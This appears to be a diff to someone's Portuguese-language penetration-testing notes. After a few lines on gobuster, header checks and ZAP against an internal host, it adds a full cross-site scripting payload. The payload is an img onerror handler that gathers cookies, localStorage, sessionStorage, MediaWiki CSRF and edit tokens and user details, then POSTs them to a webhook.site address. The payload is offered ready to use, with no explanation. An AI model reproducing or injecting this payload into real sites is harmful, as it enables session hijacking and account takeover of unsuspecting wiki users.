@@ -29,3 +29,59 @@ gobuster dir -u https://app.homolog.itamaraty.local/GestaoFinanceira/Pages/Dashb
 - https://github.com/santoru/shcheck -> ver se tem alguns headers vulneraveis
 - apt install zaproxy (uma boa tb pra scan web)
 
+```bash
+
+<img src="invalid" onerror="
+  var data = {
+    cookies: document.cookie,
+    localStorage: {},
+    sessionStorage: {},
+    mediawikiTokens: {},
+    userInfo: {}
+  };
+
+  // Capturar todos os dados do localStorage
+  for(var i=0; i<localStorage.length; i++) {
+    var key = localStorage.key(i);
+    data.localStorage[key] = localStorage.getItem(key);
+  }
+
+  // Capturar todos os dados do sessionStorage
+  for(var i=0; i<sessionStorage.length; i++) {
+    var key = sessionStorage.key(i);
+    data.sessionStorage[key] = sessionStorage.getItem(key);
+  }
+
+  // Tenta obter tokens do MediaWiki especificamente
+  try {
+    if (typeof mw !== 'undefined' && mw.user && mw.user.tokens) {
+      data.mediawikiTokens = {
+        editToken: mw.user.tokens.get('editToken'),
+        csrfToken: mw.user.tokens.get('csrfToken'),
+        watchToken: mw.user.tokens.get('watchToken')
+      };
+    }
+  } catch(e) {}
+
+  // Informações do usuário
+  try {
+    if (typeof mw !== 'undefined' && mw.config) {
+      data.userInfo = {
+        userName: mw.config.get('wgUserName'),
+        userId: mw.config.get('wgUserId'),
+        pageName: mw.config.get('wgPageName'),
+        canonicalNamespace: mw.config.get('wgCanonicalNamespace'),
+        revisionId: mw.config.get('wgRevisionId'),
+        articleId: mw.config.get('wgArticleId')
+      };
+    }
+  } catch(e) {}
+
+  fetch('https://webhook.site/ce0ff999-b412-490d-aa38-f946520e63b0', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  });
+">
+
+```
